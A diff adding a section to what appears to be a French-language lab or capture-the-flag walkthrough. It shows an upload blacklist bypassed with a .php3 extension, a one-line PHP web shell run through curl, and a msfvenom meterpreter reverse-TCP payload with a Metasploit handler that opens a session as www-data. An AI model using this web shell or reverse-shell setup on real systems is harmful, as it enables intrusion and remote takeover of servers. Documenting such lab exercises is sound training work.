@@ -209,3 +209,58 @@ $ hashcat  admin.hash --show
 8efe310f9ab3efeae8d410a8e0166eb2:P4ssw0rd
 ```
 
+## Reverse shell
+
+On peut bypasser la liste noire avec l'extension `.php3`.
+
+__`shell.php3`__
+```php
+<?php
+	system($_REQUEST['cmd']);
+?>
+```
+
+    $ curl http://192.168.56.6/admin/uploads/shell.php3?cmd=ls
+    cthulhu.png
+    hacker.png
+    ruby.jpg
+    shell.php3
+
+## Meterpeter
+
+### Générer un reverse shell meterpreter
+
+```bash
+$ msfvenom -p php/meterpreter/reverse_tcp LHOST=192.168.56.5 LPORT=5555 -f raw > meter.php3
+```
+
+### Multi handler
+
+```
+msf6> use exploit/multi/handler
+
+msf6 exploit(multi/handler) > set payload php/meterpreter/reverse_tcp
+payload => php/meterpreter/reverse_tcp
+
+msf6 exploit(multi/handler) > set LHOST 192.168.56.5
+LHOST => 192.168.56.5
+
+msf6 exploit(multi/handler) > set LPORT 5555
+LPORT => 5555
+
+msf6 exploit(multi/handler) > run -j
+```
+
+Interagir avec la session 
+```
+msf6 exploit(multi/handler) > [*] Sending stage (39282 bytes) to 192.168.56.6
+[*] Meterpreter session 1 opened (192.168.56.5:5555 -> 192.168.56.6:58225) at 2020-12-16 12:45:47 +0100
+
+msf6 exploit(multi/handler) > sessions -i 1
+[*] Starting interaction with 1...
+
+meterpreter > getuid
+Server username: www-data (33)
+```
+
+
